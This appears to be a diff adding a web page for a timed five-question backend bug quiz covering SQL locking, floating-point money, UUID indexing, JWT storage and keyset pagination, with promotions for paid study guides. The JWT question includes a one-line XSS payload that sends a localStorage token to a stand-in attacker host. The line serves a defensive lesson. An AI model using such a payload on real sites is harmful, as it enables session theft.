@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en" class="dark scroll-smooth">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Can You Pass the Senior Production Bug Test? (60s SQL, Python &amp; System Design Quiz) | GattoDev × MochaCat</title>
+  <meta name="description" content="Only 9% of backend engineers score 5/5. Spot 5 real SEV-1 production bugs in 60 seconds: SQL race conditions, IEEE-754 floats, UUIDv4 B-Tree thrashing, JWT XSS &amp; OFFSET pagination." />
+  <link rel="canonical" href="https://gabhack.github.io/mochacat-store/quiz.html" />
+
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="GattoDev × MochaCat Engineering Vault" />
+  <meta property="og:title" content="🧪 Can You Pass the 60-Second Senior Production Bug Test?" />
+  <meta property="og:description" content="5 real SEV-1 backend bugs (PostgreSQL locks, IEEE-754, UUIDv7, JWT XSS, Keyset Cursors). Play free — zero login required." />
+  <meta property="og:url" content="https://gabhack.github.io/mochacat-store/quiz.html" />
+  <meta property="og:image" content="https://gabhack.github.io/mochacat-store/assets/card_01_float.jpg" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="🧪 Can You Pass the 60s Senior Production Bug Test?" />
+  <meta name="twitter:description" content="Only 9% of engineers score 5/5 on these SQL, Concurrency &amp; System Design traps." />
+  <meta name="twitter:image" content="https://gabhack.github.io/mochacat-store/assets/card_01_float.jpg" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebApplication",
+        "name": "Senior Production Bug Test — 60-Second SQL, Python & System Design Diagnostic",
+        "url": "https://gabhack.github.io/mochacat-store/quiz.html",
+        "applicationCategory": "DeveloperApplication",
+        "operatingSystem": "Any (Web Browser)",
+        "browserRequirements": "Requires JavaScript",
+        "description": "Interactive 5-question backend engineering diagnostic testing PostgreSQL row locking, IEEE-754 floating-point precision, UUIDv4 vs UUIDv7 B-Tree indexing, JWT HttpOnly security, and SQL keyset pagination.",
+        "image": "https://gabhack.github.io/mochacat-store/assets/card_01_float.jpg",
+        "author": {
+          "@type": "Organization",
+          "name": "GattoDev × MochaCat Studio",
+          "url": "https://gabhack.github.io/mochacat-store/"
+        },
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD",
+          "availability": "https://schema.org/InStock"
+        }
+      },
+      {
+        "@type": "Quiz",
+        "name": "Can You Pass the Senior Production Bug Test?",
+        "about": ["PostgreSQL Concurrency", "System Design", "Python Backend", "Web Security", "Database Indexing"],
+        "educationalLevel": "Senior Software Engineer"
+      }
+    ]
+  }
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['"Plus Jakarta Sans"', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'monospace'],
+          }
+        }
+      }
+    };
+  </script>
+  <style>
+    body {
+      background-color: #07090e;
+      color: #f3f4f6;
+      background-image:
+        radial-gradient(circle at 15% 10%, rgba(16, 185, 129, 0.10), transparent 38%),
+        radial-gradient(circle at 85% 15%, rgba(245, 158, 11, 0.10), transparent 38%),
+        radial-gradient(circle at 50% 80%, rgba(239, 68, 68, 0.06), transparent 45%);
+    }
+    .glass {
+      background: rgba(13, 18, 31, 0.82);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      border: 1px solid rgba(255, 255, 255, 0.09);
+    }
+    .opt-btn {
+      transition: transform 0.14s ease, border-color 0.14s ease, background-color 0.14s ease;
+    }
+    .opt-btn:hover:not(:disabled) {
+      transform: translateY(-1px);
+      border-color: rgba(245, 158, 11, 0.55);
+      background: rgba(30, 41, 59, 0.75);
+    }
+  </style>
+</head>
+<body class="min-h-screen antialiased font-sans selection:bg-amber-400 selection:text-slate-950 pb-16">
+
+  <header class="border-b border-white/10 bg-[#07090e]/90 sticky top-0 z-40 backdrop-blur-xl">
+    <div class="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between gap-3">
+      <a href="./index.html" class="flex items-center gap-2.5 group">
+        <img src="assets/gattodev_avatar.jpg" alt="GattoDev" class="w-8 h-8 rounded-lg object-cover border border-emerald-400/70" />
+        <div>
+          <div class="text-xs sm:text-sm font-extrabold text-white group-hover:text-amber-300 transition">GattoDev × MochaCat</div>
+          <div class="text-[10px] font-mono text-emerald-400">SEV-1 PRODUCTION DIAGNOSTIC</div>
+        </div>
+      </a>
+      <div class="flex items-center gap-2">
+        <a href="./arena.html" class="px-3 py-1.5 rounded-lg text-xs font-bold glass text-slate-200 hover:text-amber-300 transition">⚡ 60FPS Arena</a>
+        <a href="./index.html#pricing" class="px-3 py-1.5 rounded-lg text-xs font-extrabold bg-amber-400 text-slate-950 hover:bg-amber-300 transition">📘 Vault</a>
+      </div>
+    </div>
+  </header>
+
+  <main class="max-w-3xl mx-auto px-4 pt-6 sm:pt-10">
+    <section id="screen-intro" class="glass rounded-3xl p-6 sm:p-10 space-y-6 shadow-2xl border border-emerald-400/30">
+      <div class="inline-flex flex-wrap items-center gap-2 px-3 py-1 rounded-full bg-red-500/15 border border-red-500/30 text-xs font-mono font-bold text-red-300">
+        <span class="w-2 h-2 rounded-full bg-red-400 animate-ping"></span>
+        <span>LIVE PAGERDUTY CHALLENGE • ZERO SIGNUP REQUIRED</span>
+      </div>
+
+      <h1 class="text-2xl sm:text-4xl font-extrabold tracking-tight text-white leading-tight">
+        Can You Pass the <span class="text-amber-300">Senior Production Bug Test</span> in 60 Seconds?
+      </h1>
+
+      <p class="text-sm sm:text-base text-slate-300 leading-relaxed">
+        Came from <strong class="text-emerald-300">@gattodev</strong> or <strong class="text-amber-300">@mochaloficat</strong>? Put your instincts on the clock. Spot <strong>5 real SEV-1 backend bugs</strong> across PostgreSQL concurrency, IEEE-754 money math, B-Tree internals, auth security &amp; SQL scale — then unlock your Senior Engineering Rank &amp; free starter blueprints.
+      </p>
+
+      <div class="grid grid-cols-3 gap-3 text-center">
+        <div class="p-3 rounded-2xl bg-slate-950/70 border border-white/10">
+          <div class="text-lg sm:text-xl font-extrabold font-mono text-amber-300">5 Bugs</div>
+          <div class="text-[11px] text-slate-400">Real SEV-1 Code</div>
+        </div>
+        <div class="p-3 rounded-2xl bg-slate-950/70 border border-white/10">
+          <div class="text-lg sm:text-xl font-extrabold font-mono text-emerald-400">60 Sec</div>
+          <div class="text-[11px] text-slate-400">Target Speed</div>
+        </div>
+        <div class="p-3 rounded-2xl bg-slate-950/70 border border-white/10">
+          <div class="text-lg sm:text-xl font-extrabold font-mono text-white">Top 9%</div>
+          <div class="text-[11px] text-slate-400">Score 5/5</div>
+        </div>
+      </div>
+
+      <button onclick="startQuiz()" class="w-full py-4 rounded-2xl font-extrabold text-base bg-gradient-to-r from-emerald-400 via-teal-300 to-amber-300 text-slate-950 hover:brightness-105 shadow-xl shadow-emerald-500/20 transition">
+        ⚡ Start 60-Second Bug Hunt &rarr;
+      </button>
+
+      <p class="text-center text-xs text-slate-400 font-mono">
+        Tip: On desktop, press keys <kbd class="px-1.5 py-0.5 rounded bg-white/10 text-slate-200">1</kbd>–<kbd class="px-1.5 py-0.5 rounded bg-white/10 text-slate-200">4</kbd> to answer fast.
+      </p>
+    </section>
+
+    <section id="screen-quiz" class="hidden space-y-4">
+      <div class="glass rounded-2xl p-4 flex items-center justify-between gap-4">
+        <div class="flex items-center gap-2.5">
+          <span id="q-badge" class="px-2.5 py-1 rounded-lg bg-amber-400/20 text-amber-300 font-mono text-xs font-bold">BUG 1 / 5</span>
+          <span id="q-topic" class="text-xs font-mono text-slate-300 hidden sm:inline">SQL CONCURRENCY</span>
+        </div>
+        <div class="flex items-center gap-3 font-mono text-xs">
+          <span class="text-slate-400">Score: <strong id="live-score" class="text-emerald-400">0</strong></span>
+          <span class="px-2.5 py-1 rounded-lg bg-slate-950 border border-white/10 text-amber-300 font-bold" id="live-timer">⏱ 00.0s</span>
+        </div>
+      </div>
+
+      <div class="w-full h-1.5 bg-white/10 rounded-full overflow-hidden">
+        <div id="q-progress" class="h-1.5 bg-gradient-to-r from-emerald-400 to-amber-400 transition-all duration-300" style="width: 20%"></div>
+      </div>
+
+      <div class="glass rounded-3xl p-5 sm:p-7 space-y-5 shadow-2xl">
+        <div class="space-y-2">
+          <div id="q-incident" class="text-[11px] font-mono font-bold uppercase tracking-wider text-red-400"></div>
+          <h2 id="q-title" class="text-lg sm:text-xl font-extrabold text-white leading-snug"></h2>
+        </div>
+
+        <div class="rounded-2xl overflow-hidden border border-white/15 bg-[#0b0f19]">
+          <div class="px-4 py-2 border-b border-white/10 flex items-center justify-between text-[11px] font-mono text-slate-400">
+            <div class="flex items-center gap-1.5">
+              <span class="w-2.5 h-2.5 rounded-full bg-red-500/80"></span>
+              <span class="w-2.5 h-2.5 rounded-full bg-amber-400/80"></span>
+              <span class="w-2.5 h-2.5 rounded-full bg-emerald-500/80"></span>
+              <span id="q-file" class="ml-1.5"></span>
+            </div>
+            <span class="text-red-400 font-bold">[X] PRODUCTION CODE</span>
+          </div>
+          <pre class="p-4 text-xs sm:text-[13px] font-mono text-emerald-200 overflow-x-auto leading-relaxed"><code id="q-code"></code></pre>
+        </div>
+
+        <div id="q-options" class="space-y-2.5"></div>
+
+        <div id="q-feedback" class="hidden rounded-2xl p-4 space-y-2 text-xs leading-relaxed border">
+          <div id="q-fb-head" class="font-mono font-extrabold text-sm"></div>
+          <p id="q-fb-body" class="text-slate-200"></p>
+          <div class="pt-1 font-mono text-[11px] text-amber-300" id="q-fb-chapter"></div>
+        </div>
+
+        <button id="q-next-btn" onclick="nextQuestion()" class="hidden w-full py-3.5 rounded-2xl font-extrabold text-sm bg-amber-400 hover:bg-amber-300 text-slate-950 transition shadow-lg">
+          Next Incident &rarr;
+        </button>
+      </div>
+    </section>
+
+    <section id="screen-results" class="hidden space-y-6">
+      <div class="glass rounded-3xl p-6 sm:p-8 space-y-5 border-2 border-amber-400/50 shadow-2xl text-center">
+        <div id="res-pill" class="inline-flex items-center gap-2 px-3.5 py-1 rounded-full bg-amber-400/20 text-amber-300 font-mono text-xs font-bold"></div>
+        <div class="space-y-1">
+          <div id="res-score-big" class="text-4xl sm:text-6xl font-extrabold font-mono text-white"></div>
+          <h2 id="res-rank" class="text-xl sm:text-2xl font-extrabold text-emerald-300"></h2>
+          <p id="res-summary" class="text-xs sm:text-sm text-slate-300 max-w-xl mx-auto pt-1"></p>
+        </div>
+
+        <div id="res-missed-box" class="text-left rounded-2xl bg-slate-950/85 border border-white/10 p-4 space-y-2">
+          <div class="text-xs font-mono font-bold uppercase text-amber-300">📋 Your Production Diagnostic &amp; Recommended Chapters:</div>
+          <ul id="res-missed-list" class="space-y-1.5 text-xs text-slate-300 font-mono"></ul>
+        </div>
+
+        <div class="flex flex-wrap items-center justify-center gap-3 pt-1">
+          <button onclick="copyChallengeScore(this)" class="px-4 py-2.5 rounded-xl text-xs font-bold bg-white/10 hover:bg-white/20 text-white border border-white/15 transition">
+            📋 Copy Score Challenge for Team Slack / Discord
+          </button>
+          <button onclick="restartQuiz()" class="px-4 py-2.5 rounded-xl text-xs font-bold text-slate-400 hover:text-white transition">
+            ↻ Retry Quiz
+          </button>
+        </div>
+      </div>
+
+      <div class="space-y-4">
+        <div class="text-center space-y-1">
+          <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold">🎁 Quiz Finisher Rewards Unlocked</span>
+          <h3 class="text-xl sm:text-2xl font-extrabold text-white">Fix Every Production Trap Before Your Next PR or Staff Interview</h3>
+          <p class="text-[11px] text-slate-400">🌍 Fair Regional Pricing (PPP) up to 50% OFF is automatically applied at Gumroad checkout for LATAM, India &amp; Southeast Asia.</p>
+        </div>
+
+        <!-- TIER 0: FREE STARTER PACK ($0 with price=0&wanted=true!) -->
+        <div class="rounded-3xl bg-gradient-to-r from-emerald-950/80 via-slate-900/95 to-emerald-950/50 border-2 border-emerald-400/60 p-5 sm:p-6 space-y-3 shadow-xl">
+          <div class="flex flex-wrap items-center justify-between gap-2">
+            <span class="px-2.5 py-0.5 rounded-md bg-emerald-400/20 text-emerald-300 font-mono text-[11px] font-bold">STEP 1 • FREE INSTANT UNLOCK ($0)</span>
+            <span class="text-xs font-mono text-emerald-300 font-bold">19 MB ZIP + 25-Trap PDF</span>
+          </div>
+          <h4 class="text-base sm:text-lg font-extrabold text-white">FREE Senior SQL, Python &amp; System Design Starter Pack</h4>
+          <p class="text-xs text-slate-300">Includes <strong>5 HD Visual IDE Cheat Cards (#01–#05)</strong> + <strong>25 Production Traps Cheat Sheet PDF</strong> + <strong>5 Studio 320kbps DMCA-Safe Lo-Fi Tracks</strong>.</p>
+          <form onsubmit="claimQuizFreePack(event)" class="flex flex-col sm:flex-row gap-2.5 pt-1">
+            <input type="email" id="quiz-email" placeholder="Work or personal email (optional prefill)..." class="flex-1 px-4 py-3 rounded-xl bg-slate-950 border border-white/15 text-xs sm:text-sm text-white focus:outline-none focus:border-emerald-400" />
+            <button type="submit" class="px-5 py-3 rounded-xl font-extrabold text-xs sm:text-sm bg-emerald-400 hover:bg-emerald-300 text-slate-950 transition shadow-lg shadow-emerald-500/25 whitespace-nowrap">
+              🎁 Claim FREE Starter Pack ($0) &rarr;
+            </button>
+          </form>
+        </div>
+
+        <!-- TIER 1 ($7 IMPULSE DECK) & TIER 2 ($19 PLAYBOOK) -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div class="glass rounded-3xl p-5 sm:p-6 border-2 border-cyan-400/50 flex flex-col justify-between space-y-4">
+            <div class="space-y-2.5">
+              <div class="flex items-center justify-between">
+                <span class="px-2.5 py-0.5 rounded-md bg-cyan-400/20 text-cyan-300 font-mono text-[11px] font-bold">⚡ COFFEE-PRICE IMPULSE PICK</span>
+                <span class="text-2xl font-extrabold font-mono text-cyan-300">$7</span>
+              </div>
+              <h4 class="text-base sm:text-lg font-extrabold text-white">GattoDev: 50 Billion-Dollar Bugs &amp; SQL Fixes Deck</h4>
+              <p class="text-xs text-slate-300 leading-relaxed">
+                Complete offline field manual behind our viral 60FPS Shorts: <strong>50 Production Bugs &amp; SQL Fixes PDF</strong> + <strong>Runnable <code>.py</code>/<code>.sql</code> Repros</strong> + <strong>25-Point Pre-Merge PR Checklist</strong>.
+              </p>
+            </div>
+            <a href="https://gabbler407.gumroad.com/l/gattodev-bugs" target="_blank" rel="noopener noreferrer"
+               class="w-full py-3 rounded-xl font-extrabold text-xs sm:text-sm bg-cyan-400 hover:bg-cyan-300 text-slate-950 text-center transition block shadow-md">
+              💥 Unlock 50-Bug Pocket Deck — $7 &rarr;
+            </a>
+          </div>
+
+          <div class="rounded-3xl bg-gradient-to-b from-[#171f34] to-[#0c111d] p-5 sm:p-6 border-2 border-amber-400 flex flex-col justify-between space-y-4 shadow-xl">
+            <div class="space-y-2.5">
+              <div class="flex items-center justify-between">
+                <span class="px-2.5 py-0.5 rounded-md bg-amber-400/20 text-amber-300 font-mono text-[11px] font-bold">★ COMPLETE ARCHITECTURE SYSTEM</span>
+                <span class="text-2xl font-extrabold font-mono text-amber-400">$19</span>
+              </div>
+              <h4 class="text-base sm:text-lg font-extrabold text-white">Full 30-Blueprint Senior System Design Playbook</h4>
+              <p class="text-xs text-slate-200 leading-relaxed">
+                All <strong>30 side-by-side <code>[X] BUG</code> vs <code>[OK] FIX</code> chapters</strong>, <strong>30 runnable <code>.py</code> benchmark scripts</strong>, 30 HD cards + Latency Table.
+              </p>
+            </div>
+            <div class="space-y-2">
+              <a href="https://gabbler407.gumroad.com/l/yhfgla" target="_blank" rel="noopener noreferrer"
+                 class="w-full py-3 rounded-xl font-extrabold text-xs sm:text-sm bg-gradient-to-r from-amber-400 to-yellow-300 hover:brightness-105 text-slate-950 text-center transition block shadow-lg">
+                📘 Get All 30 Blueprints + Scripts — $19 &rarr;
+              </a>
+              <a href="https://gabbler407.gumroad.com/l/vwfhp" target="_blank" rel="noopener noreferrer"
+                 class="block text-center text-[11px] font-mono text-amber-300 hover:underline">
+                Or add 50 DMCA-Safe Lo-Fi Tracks in the Complete Bundle ($29) &rarr;
+              </a>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass rounded-2xl p-4 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-slate-300">
+          <span>Want to watch <code>Seq Scan</code> vs <code>B-Tree</code> race live at 60 FPS?</span>
+          <div class="flex flex-wrap gap-2">
+            <a href="./arena.html" class="px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 font-bold text-emerald-300 transition">⚡ Launch 60FPS SQL Arena</a>
+            <a href="https://www.youtube.com/@gattodev?sub_confirmation=1" target="_blank" rel="noopener" class="px-3 py-1.5 rounded-lg bg-red-600/90 hover:bg-red-500 font-bold text-white transition">▶ Subscribe @gattodev</a>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    const QUESTIONS = [
+      {
+        topic: "SQL CONCURRENCY",
+        incident: "🚨 SEV-1 INCIDENT #09 • DOUBLE-SPEND WALLET DRAIN",
+        file: "09_bank_race_condition.py",
+        chapter: "Chapter #09: Atomic Row Locks & Idempotent Ledger Updates",
+        title: "At 5,000 req/s, two concurrent requests for user #42 ($100 balance) both pass `if bal >= 100` and withdraw $200 total. What is the true Senior production fix?",
+        code: `bal = db.get("SELECT bal FROM accts WHERE id = 42")\nif bal >= 100:  # Thread A & Thread B both read 100!\n    db.exec("UPDATE accts SET bal = bal - 100 WHERE id = 42")`,
+        options: [
+          "Add `await asyncio.sleep(0.05)` before `UPDATE` so threads stagger",
+          "Use an explicit transaction with `SELECT ... FOR UPDATE` (or atomic `UPDATE ... WHERE id=42 AND bal >= 100 RETURNING bal`)",
+          "Put a Redis cache with 60s TTL in front of `SELECT bal`",
+          "Switch transaction isolation to `READ UNCOMMITTED`"
+        ],
+        correct: 1,
+        explain: "Read-Modify-Write without row locking lets concurrent transactions read stale balances. Serialize row access with `SELECT ... FOR UPDATE` inside a transaction or run an atomic conditional `UPDATE ... WHERE id = 42 AND bal >= 100`."
+      },
+      {
+        topic: "IEEE-754 PRECISION",
+        incident: "🚨 SEV-1 INCIDENT #01 • SILENT BILLING RECONCILIATION BUG",
+        file: "01_float_money_trap.py",
+        chapter: "Chapter #01: IEEE-754 Binary Floating-Point Trap",
+        title: "Customers paying two items of $0.10 and $0.20 against a $0.30 invoice get stuck in `UNPAID` forever. Why, and how do you store money?",
+        code: `paid = 0.10 + 0.20\ninvoice_total = 0.30\nif paid == invoice_total:\n    mark_invoice_paid()  # NEVER EXECUTES!`,
+        options: [
+          "Python 3 bug — switching to Node.js `number` fixes binary float math",
+          "0.1 + 0.2 is `0.30000000000000004` in IEEE-754 binary; store integer minor units (`BIGINT` cents) or exact `NUMERIC(19,4)` / `Decimal('0.10')`",
+          "Switch database column from `FLOAT4` to `DOUBLE PRECISION` (`FLOAT8`)",
+          "Convert numbers to strings and compare first 3 characters"
+        ],
+        correct: 1,
+        explain: "Every IEEE-754 float language (Python, JS, Go, Rust, C++) represents 0.1 as an infinite repeating binary fraction. Never store money in `FLOAT`/`DOUBLE`—use integer cents (`BIGINT`) or exact `Decimal`/`NUMERIC`."
+      },
+      {
+        topic: "DATABASE INTERNALS",
+        incident: "🚨 SEV-1 INCIDENT #20 • POSTGRESQL WRITE IOPS MELTDOWN",
+        file: "20_uuid_btree_thrash.sql",
+        chapter: "Chapter #20: UUIDv4 vs Timestamp-Ordered UUIDv7 B-Trees",
+        title: "At 80M rows, inserting into `events` with random `UUIDv4` primary keys spikes disk write IOPS 14x and tanks buffer cache hits to 38%. Why?",
+        code: `CREATE TABLE events (\n  id UUID PRIMARY KEY DEFAULT gen_random_uuid(), -- random v4\n  payload JSONB NOT NULL\n);`,
+        options: [
+          "Random UUIDv4 forces inserts into cold middle B-Tree pages across disk, causing constant page splits & WAL bloat — switch to timestamp-prefixed `UUIDv7`",
+          "PostgreSQL cannot index `UUID` columns; convert UUIDs to `TEXT`",
+          "Drop the `PRIMARY KEY` constraint in production to avoid B-Trees",
+          "Run `VACUUM FULL` via cron every 5 minutes during peak traffic"
+        ],
+        correct: 0,
+        explain: "`UUIDv7` (built into PostgreSQL 18+ and Python/Node libs) prefixes a 48-bit Unix millisecond timestamp, so new keys append monotonically at the right edge of the B-Tree—keeping hot pages in RAM."
+      },
+      {
+        topic: "AUTH & WEB SECURITY",
+        incident: "🚨 SEV-1 INCIDENT #11 • 40,000 SESSIONS EXFILTRATED",
+        file: "11_jwt_xss_steal.js",
+        chapter: "Chapter #11: JWT in localStorage vs HttpOnly SameSite Cookies",
+        title: "A compromised third-party chat widget executes 1 line of JS and steals every logged-in user's JWT. What stops JavaScript from reading session tokens?",
+        code: `// Login handler in SPA:\nlocalStorage.setItem("access_token", res.jwt);\n// Attacker's 1-line XSS payload:\nfetch("https://evil.example/log?t=" + localStorage.access_token);`,
+        options: [
+          "Base64-encode the JWT twice before saving it in `sessionStorage`",
+          "Set token expiration to 365 days so refresh tokens aren't needed",
+          "Deliver tokens via `Set-Cookie` with `HttpOnly; Secure; SameSite=Strict` (plus short TTL + CSRF defense) so `document.cookie` / JS cannot read them",
+          "Rename the `localStorage` key from `access_token` to `_x9f2`"
+        ],
+        correct: 2,
+        explain: "Both `localStorage` and `sessionStorage` are 100% readable by any script running in your origin. `HttpOnly` cookies are invisible to JavaScript (`document.cookie`), neutralizing direct token exfiltration."
+      },
+      {
+        topic: "SQL SCALE & LATENCY",
+        incident: "🚨 SEV-1 INCIDENT #14 • PAGINATION CPU FIRE AT PAGE 250,000",
+        file: "14_keyset_pagination.sql",
+        chapter: "Chapter #14: SQL OFFSET Disasters vs O(log N) Keyset Cursors",
+        title: "A bot requests page 250,000 (`LIMIT 20 OFFSET 5000000`). Even with an index on `created_at`, query time hits `8,920 ms`. How do you drop it to `0.11 ms`?",
+        code: `SELECT id, created_at, total\nFROM orders\nORDER BY id DESC\nLIMIT 20 OFFSET 5000000;`,
+        options: [
+          "Increase `LIMIT` to `10000` so bots make fewer HTTP requests",
+          "Replace `OFFSET` with a Keyset Seek Cursor: `WHERE id < :last_seen_id ORDER BY id DESC LIMIT 20`",
+          "Use `SELECT DISTINCT *` so PostgreSQL skips duplicate rows",
+          "Disable sequential scans globally on the cluster"
+        ],
+        correct: 1,
+        explain: "`OFFSET 5000000` forces the DB engine to walk and discard 5,000,000 rows just to return 20. Keyset pagination (`WHERE id < :last_seen_id`) jumps straight to the B-Tree leaf in 3 page reads (`O(log N)`)."
+      }
+    ];
+
+    let qIdx = 0, score = 0, startTime = 0, elapsedSec = 0, timerRaf = null, answered = false, resultsLog = [];
+
+    function startQuiz() {
+      qIdx = 0; score = 0; resultsLog = [];
+      document.getElementById("screen-intro").classList.add("hidden");
+      document.getElementById("screen-results").classList.add("hidden");
+      document.getElementById("screen-quiz").classList.remove("hidden");
+      startTime = performance.now();
+      tickTimer();
+      renderQuestion();
+    }
+
+    function tickTimer() {
+      elapsedSec = (performance.now() - startTime) / 1000;
+      document.getElementById("live-timer").textContent = "⏱ " + elapsedSec.toFixed(1) + "s";
+      timerRaf = requestAnimationFrame(tickTimer);
+    }
+
+    function renderQuestion() {
+      answered = false;
+      const q = QUESTIONS[qIdx];
+      document.getElementById("q-badge").textContent = `BUG ${qIdx + 1} / ${QUESTIONS.length}`;
+      document.getElementById("q-topic").textContent = q.topic;
+      document.getElementById("live-score").textContent = score;
+      document.getElementById("q-progress").style.width = (((qIdx + 1) / QUESTIONS.length) * 100) + "%";
+      document.getElementById("q-incident").textContent = q.incident;
+      document.getElementById("q-title").textContent = q.title;
+      document.getElementById("q-file").textContent = q.file;
+      document.getElementById("q-code").textContent = q.code;
+
+      document.getElementById("q-feedback").classList.add("hidden");
+      document.getElementById("q-next-btn").classList.add("hidden");
+
+      const wrap = document.getElementById("q-options");
+      wrap.innerHTML = "";
+      const keys = ["1", "2", "3", "4"];
+      q.options.forEach((optText, i) => {
+        const btn = document.createElement("button");
+        btn.type = "button";
+        btn.className = "opt-btn w-full text-left p-3.5 sm:p-4 rounded-2xl bg-slate-950/75 border border-white/12 flex items-start gap-3 text-xs sm:text-sm text-slate-200";
+        btn.innerHTML = `<span class="px-2 py-0.5 rounded-md bg-white/10 font-mono text-xs font-bold text-amber-300 flex-shrink-0 mt-0.5">${keys[i]}</span><span class="leading-snug">${escapeHtml(optText)}</span>`;
+        btn.onclick = () => selectAnswer(i);
+        wrap.appendChild(btn);
+      });
+    }
+
+    function selectAnswer(choiceIdx) {
+      if (answered) return;
+      answered = true;
+      const q = QUESTIONS[qIdx];
+      const isOk = choiceIdx === q.correct;
+      if (isOk) score++;
+      resultsLog.push({ q, isOk });
+      document.getElementById("live-score").textContent = score;
+
+      Array.from(document.getElementById("q-options").children).forEach((b, i) => {
+        b.disabled = true;
+        if (i === q.correct) {
+          b.className = "w-full text-left p-3.5 sm:p-4 rounded-2xl bg-emerald-950/60 border-2 border-emerald-400 flex items-start gap-3 text-xs sm:text-sm text-white font-semibold";
+        } else if (i === choiceIdx && !isOk) {
+          b.className = "w-full text-left p-3.5 sm:p-4 rounded-2xl bg-red-950/60 border-2 border-red-400 flex items-start gap-3 text-xs sm:text-sm text-red-200";
+        } else {
+          b.classList.add("opacity-50");
+        }
+      });
+
+      const fb = document.getElementById("q-feedback");
+      fb.className = isOk
+        ? "rounded-2xl p-4 space-y-1.5 text-xs leading-relaxed border bg-emerald-950/40 border-emerald-500/40"
+        : "rounded-2xl p-4 space-y-1.5 text-xs leading-relaxed border bg-red-950/40 border-red-500/40";
+      document.getElementById("q-fb-head").innerHTML = isOk
+        ? "<span class='text-emerald-300'>✓ PATCH MERGED — Zero Downtime!</span>"
+        : "<span class='text-red-300'>✕ SEV-1 TRIGGERED — PagerDuty Alert!</span>";
+      document.getElementById("q-fb-body").textContent = q.explain;
+      document.getElementById("q-fb-chapter").textContent = "📘 Deep-dive in Playbook → " + q.chapter;
+
+      const nextBtn = document.getElementById("q-next-btn");
+      nextBtn.textContent = qIdx < QUESTIONS.length - 1 ? "Next Production Bug →" : "See My Senior Engineering Rank & Rewards →";
+      nextBtn.classList.remove("hidden");
+    }
+
+    function nextQuestion() {
+      if (qIdx < QUESTIONS.length - 1) { qIdx++; renderQuestion(); }
+      else { finishQuiz(); }
+    }
+
+    function finishQuiz() {
+      if (timerRaf) cancelAnimationFrame(timerRaf);
+      document.getElementById("screen-quiz").classList.add("hidden");
+      document.getElementById("screen-results").classList.remove("hidden");
+
+      document.getElementById("res-pill").textContent = `COMPLETED IN ${elapsedSec.toFixed(1)}s • VERIFIED BENCHMARK`;
+      document.getElementById("res-score-big").textContent = `${score} / ${QUESTIONS.length}`;
+
+      let rank = "", summary = "";
+      if (score === 5) {
+        rank = "👑 Principal Distinguished Wizard (Top 2%)";
+        summary = "Flawless! Every race condition, B-Tree split, and XSS vector died in code review. Grab all 50 bug cards or 30 runnable scripts below.";
+      } else if (score === 4) {
+        rank = "🛡️ Staff Backend Architect (Top 9%)";
+        summary = "Battle-tested instincts! Only 1 subtle production edge-case slipped past you. Review that exact blueprint below.";
+      } else if (score >= 2) {
+        rank = "⚡ Senior / Staff Engineer Potential (Top 28%)";
+        summary = "Solid core instincts, but subtle concurrency & database internals traps triggered SEV-1s under high load.";
+      } else {
+        rank = "🔥 Production Pyromaniac (PagerDuty's Nightmare)";
+        summary = "Those 5 traps silently take down real startups every week. Grab the FREE Starter Pack right now before your next PR!";
+      }
+      document.getElementById("res-rank").textContent = rank;
+      document.getElementById("res-summary").textContent = summary;
+
+      const list = document.getElementById("res-missed-list");
+      list.innerHTML = "";
+      resultsLog.forEach((item, idx) => {
+        const li = document.createElement("li");
+        li.innerHTML = item.isOk
+          ? `<span class="text-emerald-400">✓ Q${idx + 1} (${item.q.topic}):</span> Passed`
+          : `<span class="text-red-400">✕ Q${idx + 1} (${item.q.topic}):</span> Missed — Study <strong class="text-amber-300">${item.q.chapter}</strong>`;
+        list.appendChild(li);
+      });
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    function restartQuiz() { startQuiz(); }
+
+    function claimQuizFreePack(e) {
+      e.preventDefault();
+      const email = (document.getElementById("quiz-email").value || "").trim();
+      const url = "https://gabbler407.gumroad.com/l/muyuv?price=0&wanted=true" + (email ? "&email=" + encodeURIComponent(email) : "");
+      window.open(url, "_blank");
+    }
+
+    function copyChallengeScore(btn) {
+      const blocks = resultsLog.map(r => r.isOk ? "🟩" : "🟥").join("");
+      const txt = `🧪 Senior Production Bug Test: ${score}/5 ${blocks} in ${elapsedSec.toFixed(1)}s!\nCan you beat my score on SQL locks, UUIDv7 & XSS? 👉 https://gabhack.github.io/mochacat-store/quiz.html`;
+      navigator.clipboard.writeText(txt).then(() => {
+        const prev = btn.textContent;
+        btn.textContent = "✅ Copied! Paste in Slack / Discord";
+        setTimeout(() => { btn.textContent = prev; }, 2400);
+      });
+    }
+
+    function escapeHtml(s) {
+      return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    }
+
+    document.addEventListener("keydown", (e) => {
+      if (document.getElementById("screen-quiz").classList.contains("hidden")) return;
+      if (!answered && ["1", "2", "3", "4"].includes(e.key)) selectAnswer(Number(e.key) - 1);
+      else if (answered && e.key === "Enter") nextQuestion();
+    });
+  </script>
+</body>
+</html>
